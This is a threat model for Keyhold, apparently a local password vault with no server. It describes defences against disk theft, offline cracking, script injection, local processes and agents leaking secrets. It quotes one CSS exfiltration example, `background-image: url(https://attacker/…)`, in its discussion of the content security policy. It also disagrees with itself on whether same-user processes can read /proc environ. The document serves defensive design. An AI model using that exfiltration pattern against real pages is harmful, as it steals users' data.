# Threat model

A vault that leaks once has lost its reason to exist, so it is worth being explicit about which
attacks Keyhold is built to survive, which it is not, and why.

The context that shapes all of it: **Keyhold has no server.** There is no account, no sync, no
operator. That removes an entire class of threat — nobody else's database can leak your vault —
and it moves the remaining ones onto your own machine.

## What Keyhold defends against

### T1 · Your disk is read

A backup lands in cloud storage. A synced folder is shared. A drive is sold, or stolen, or handed
to a repair shop. Another program on the machine walks your home directory.

**Defence.** The vault file is ciphertext under a key derived from your master password. There is
no key material stored beside it and no escrow copy. The file, the WAL sidecar and the directory
holding them are owner-only, re-checked on every open.

### T2 · The file is attacked offline

Somebody has the file and all the time in the world.

**Defence.** Argon2id with a 64 MiB memory cost, three iterations. This is the only thing that
matters in this scenario: an attacker with the file does not talk to Keyhold, so rate limiting and
attempt counters are theatre. The KDF parameters are recorded in the file and versioned so they can
be raised as hardware improves.

### T3 · A tampered or rolled-back vault

An attacker with write access to the file swaps a record for an older version of itself — restoring
a password you rotated after it leaked.

**Defence.** AES-GCM with additional authenticated data binding each payload to its record identity
and its version number. Decryption fails; it does not return an older plaintext.

### T4 · Script running on the interface page

The single most dangerous thing that can happen to a browser-based vault: the page that renders
your secrets also holds the session and the decrypted values. A malicious dependency, a stored
value rendered as markup, one `innerHTML`.

**Defence, in layers.** A CSP served with every response, built around the directive that matters:
`script-src 'self'` — no `unsafe-inline`, no `unsafe-eval`, no remote origin. Every line of
JavaScript the browser runs came out of the binary, and a test asserts that this directive is
exactly that string rather than merely containing it.

`style-src` does allow `unsafe-inline`, and that is a deliberate, measured trade. The interface's
components position popovers and dialogs by writing `style` on an element at runtime, which is how
every serious component library does it — a menu's position is not knowable at build time. Under
`style-src 'self'` the browser blocks those writes, and the result is not cosmetic: selects open in
the wrong place and scroll areas lose their scrollbars. What the concession costs is that an
attacker who could already inject markup could also inject CSS; what stops that being useful is the
rest of the policy. With `default-src 'none'`, `img-src 'self' data:`, `font-src 'self'` and
`connect-src 'self'`, injected CSS has nowhere to send anything — the classic
`background-image: url(https://attacker/…)` exfiltration has no reachable origin. Injected styles
can deface this page; they cannot phone home.

Beyond the policy: the whole bundle is compiled into the binary — there is no directory to drop a
file into, and nothing is fetched at runtime. No markdown or rich-text renderer anywhere. A test
fails the build on `innerHTML`, `eval`, `new Function`, or any remote URL in the interface source.

### T5 · Another local process

The Unix model does not separate processes running as the same user. Anything you run can connect to
Keyhold's port.

**Defence.** Every API route requires a session token that is generated per run, never written to
disk, delivered in the URL fragment, and compared in constant time. Authentication is a custom
header rather than a cookie, so a page in another tab cannot have the browser attach credentials on
its behalf. The agent surface (see the roadmap) uses a `0600` unix socket rather than a port, so
filesystem permission is the authentication and there is no token in a config file to steal.

### T6 · An unattended unlocked vault

You walk away. The laptop stays open.

**Defence.** Auto-lock on inactivity and on the window being hidden, both configurable, plus a lock
action always in reach. Locking wipes the key from memory rather than hiding the interface.

### T7 · The clipboard

Copying a password puts it somewhere Keyhold does not control.

**Defence.** Copies are cleared after a deadline, the countdown is visible, and a copy you make
yourself in the meantime cancels the clear rather than wiping your clipboard. The interface says
plainly that the operating system may keep a clipboard history no program can reach.

### T8 · Secrets escaping through logs, crashes and telemetry

The classic way a well-encrypted secret ends up in plaintext: an error report.

**Defence.** No telemetry of any kind. Key material is zeroized on drop, kept out of `Debug`
output, and never placed in argv or an inherited environment variable — `/proc/*/cmdline` and
`/proc/*/environ` are readable by any process of the same user. Release builds abort rather than
unwind on panic: an unwind mid-operation can drop key material in an order zeroization does not
cover.

### T9 · A secret an assistant repeats

An agent given a value can write it anywhere it writes: into a chat transcript, a summary, a commit
message, a file. This is not a failure of the agent — it is what having the value means.

**Defence.** Not instruction. The tool descriptions do ask, and nothing relies on it. What works is
never handing the value over:

- `keyhold_run` and `keyhold run` execute a command with the secret in the child process's
  environment. The agent composes the command and reads its output; the value is never in its
  context, so it cannot be repeated from there.
- `keyhold_copy` puts a value on the person's clipboard and returns only a confirmation, for the
  case where a human — not the model — is the one who needs it.
- Reading a value outright is **off by default**. With it off the tool is not listed and the request
  is refused, so there is no path from a vault to a transcript.

The environment is used rather than the command line for the same reason throughout: `/proc/*/cmdline`
is readable by every process of this user, and `/proc/*/environ` is not.

## What Keyhold does not defend against

Stated plainly, because a vault that implies otherwise is lying:

- **Malware running as you.** A keylogger captures the master password as it is typed. A debugger
  attached to the process reads the key while the vault is open. Keyhold narrows the window; it
  does not outrank the kernel.
- **A compromised browser.** An extension with access to the page can read what the page renders.
  If you do not trust the browser, do not unlock the vault in it.
- **Screenshots, cameras, and memory.** A revealed secret is revealed.
- **Losing both the master password and the recovery key.** There is no recovery. This is not an
  oversight to be fixed later — an escrow copy would be a single target holding everything, and its
  absence is what makes the first promise true.

## Choices that were considered and rejected

| Alternative | Why not |
|---|---|
| Encrypting with a key stored beside the vault | Whoever reads the file reads the key. That is obfuscation, not confidentiality |
| Escrow or a reset code held anywhere | Recovers the forgetful user by creating a master key to everything: a rare risk traded for a catastrophic one |
| Validating the master password against a stored hash | Gives an offline attacker a cheap oracle. Decryption failure is the only check needed |
| A scored entropy meter | `log2(alphabet) × length` is exact for a generated password and a lie for a human one. Keyhold reports named, checkable findings instead |
| Serving the interface on a network interface | There is no version of this product that should. The bind address is not configurable |
